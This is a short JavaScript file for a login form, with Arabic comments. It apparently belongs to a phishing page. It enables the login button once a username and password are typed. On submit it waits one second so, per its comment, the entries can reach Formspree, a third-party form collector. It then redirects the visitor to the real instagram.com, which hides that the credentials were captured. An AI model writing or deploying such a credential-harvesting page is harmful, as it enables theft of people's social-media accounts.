document.addEventListener('DOMContentLoaded', () => {
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const loginBtn = document.getElementById('loginBtn');
    const loginForm = document.getElementById('loginForm');

    // التحقق من الحقول لتفعيل الزر
    function validateInputs() {
        if (usernameInput.value.trim().length > 0 && passwordInput.value.length >= 6) {
            loginBtn.disabled = false;
        } else {
            loginBtn.disabled = true;
        }
    }

    usernameInput.addEventListener('input', validateInputs);
    passwordInput.addEventListener('input', validateInputs);

    // عند الضغط على تسجيل الدخول
    loginForm.addEventListener('submit', () => {
        // ننتظر ثانية واحدة لضمان بدء إرسال البيانات لـ Formspree ثم نحول المستخدم
        setTimeout(() => {
            window.location.href = "https://www.instagram.com/";
        }, 1000);
    });
});
